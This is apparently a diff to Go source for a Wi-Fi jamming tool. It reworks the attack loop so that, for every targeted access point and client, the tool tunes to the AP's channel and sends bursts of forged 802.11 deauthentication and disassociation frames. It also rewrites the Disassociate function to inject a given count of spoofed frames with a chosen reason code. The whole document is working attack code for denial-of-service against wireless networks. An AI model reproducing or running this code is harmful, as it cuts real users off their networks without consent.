@@ -198,10 +198,10 @@ func	(conn *JamConn)	SetupPcapHandle() error {
 	if err != nil {
 		log.Fatalln("pcap.NewInactiveHandle() ", err)
 	}
-	if err := inactive.SetBufferSize(DefPcapBufLen); err != nil {
+	if err := inactive.SetBufferSize(DefPcapBufLen ); err != nil {
 		log.Fatalln(err)
 	}
-	if err := inactive.SetSnapLen(512); err != nil {
+	if err := inactive.SetSnapLen(1024); err != nil {
 		log.Fatalln(err)
 	}
 	if err := inactive.SetTimeout(time.Millisecond * 100); err != nil {
@@ -336,23 +336,6 @@ func	(conn *JamConn) DoAPScan(apWList *List, apList *List) (err error) {
 	return nil
 }
 
-func	(conn *JamConn)	ChangeChanIfPast(apList *List, timeout time.Duration) {
-
-	if time.Since(conn.lastChanSwitch) > timeout {
-		inx := randInt(0, len(apList.contents))
-		i := 0
-		for _, v := range apList.contents {
-			if i == inx {
-				ap := (v).(AP)
-				_ = conn.SetDeviceFreq(layers.RadioTapChannelFrequency(ap.freq))
-			}
-			i++
-
-		}
-		conn.lastChanSwitch = time.Now()
-	}
-}
-
 func	(conn *JamConn)	DoAPScanIfPast(timeout time.Duration, APWList *List, APTargList *List) {
 
 	if time.Since(conn.lastAPScan) > timeout {
@@ -362,11 +345,18 @@ func	(conn *JamConn)	DoAPScanIfPast(timeout time.Duration, APWList *List, APTarg
 	}
 }
 
-func	(conn *JamConn)	DeauthClientsIfPast(timeout time.Duration, count uint16, apList *List) {
+func	(conn *JamConn) AttackIfPast(timeout time.Duration, count uint16, apList *List) {
 
 	if time.Since(conn.lastDeauth) > timeout {
 		for _, v := range apList.contents {
 			ap := v.(AP)
+			if ap.tap.ChannelFrequency != 0 {
+				if err := conn.SetDeviceFreq(ap.tap.ChannelFrequency); err != nil {
+					if !OptsG.GuiMode {
+						fmt.Println(err)
+					}
+				}
+			}
 			for _, cli := range ap.clients {
 				//Previous authentication no longer valid.
 				bSent, err := conn.Deauthenticate(
@@ -386,6 +376,23 @@ func	(conn *JamConn)	DeauthClientsIfPast(timeout time.Duration, count uint16, ap
 				StatsG.nDeauth += uint32(count)
 				ap.nDeauth += uint32(count)
 				cli.nDeauth += uint32(count)
+				bSent, err = conn.Disassociate(
+					count, 0x2,
+					ap.hwaddr, cli.hwaddr,
+					ap.tap, ap.dot)
+				if err != nil {
+					if err.Error() == "send: Bad file descriptor" {
+						QuitG = true
+						return
+					} else {
+						log.Panicln("JamConn.Deauthenticate() " + err.Error())
+					}
+				}
+				StatsG.nByteTx += uint64(bSent)
+				StatsG.nPktTx += uint64(count)
+				StatsG.nDisassc += uint32(count)
+				ap.nDisassc += uint32(count)
+				cli.nDisassc += uint32(count)
 				ApListMutexG.Lock()
 				apList.Add(ap.hwaddr.String()[:16], ap)
 				ApListMutexG.Unlock()
@@ -433,13 +440,7 @@ func	(conn *JamConn)	Deauthenticate(
 	var buff		gopacket.SerializeBuffer
 	var bSent		uint32
 
-	if tap.ChannelFrequency != 0 {
-		if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil {
-			if !OptsG.GuiMode {
-				fmt.Println(err)
-			}
-		}
-	}
+
 	opts.ComputeChecksums = true
 	opts.FixLengths = true
 	if !OptsG.GuiMode {
@@ -467,32 +468,39 @@ func	(conn *JamConn)	Deauthenticate(
 }
 
 func	(conn *JamConn)	Disassociate(
-			src net.HardwareAddr, dst net.HardwareAddr,
-			tap layers.RadioTap, dot11Orig layers.Dot11) error {
+	count uint16, reason layers.Dot11Reason,
+	src net.HardwareAddr, dst net.HardwareAddr,
+	tap layers.RadioTap, dot11Orig layers.Dot11) (nBytes uint32, err error) {
 
-	var buff	gopacket.SerializeBuffer
-	var opts	gopacket.SerializeOptions
+	var i			uint16
+	var opts		gopacket.SerializeOptions
+	var buff		gopacket.SerializeBuffer
+	var bSent		uint32
 
-	if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil && !OptsG.GuiMode {
-		fmt.Println(err)
-	}
-	buff = gopacket.NewSerializeBuffer()
 	opts.ComputeChecksums = true
 	opts.FixLengths = true
+	if !OptsG.GuiMode {
+		fmt.Printf("sending %d deauth frames from src %s - to %s\n", count, src.String(), dst.String())
+	}
 	dot11 := createDot11Header(
 		layers.Dot11TypeMgmtDisassociation, src, dst,
-		dot11Orig.DurationID, dot11Orig.SequenceNumber + 1)
-	mgmt := layers.Dot11MgmtDisassociation { Reason: layers.Dot11ReasonDisasStLeaving }
-	if err := gopacket.SerializeLayers(buff, opts, &tap, &dot11, &mgmt); err != nil {
-		return errors.New("gopacket.SerializeLayers() " + err.Error())
+		dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
+	mgmt := layers.Dot11MgmtDisassociation { Reason: reason }
+	for i = 0; i < count; i++ {
+		buff = gopacket.NewSerializeBuffer()
+		if err := gopacket.SerializeLayers(buff, opts, &tap, &dot11, &mgmt); err != nil {
+			return bSent, err
+		}
+		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
+			if err.Error() == "send: Resource temporarily unavailable" {
+				return 0, nil
+			}
+			return bSent, err
+		}
+		bSent += uint32(len(buff.Bytes()))
+		dot11.SequenceNumber += 1
 	}
-	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
-		return errors.New("Handle.WritePacketData() " + err.Error())
-	}
-	if !OptsG.GuiMode {
-		fmt.Printf("deauthing src %s - from %s\n", src.String(), dst.String())
-	}
-	return nil
+	return bSent, nil
 }
 
 
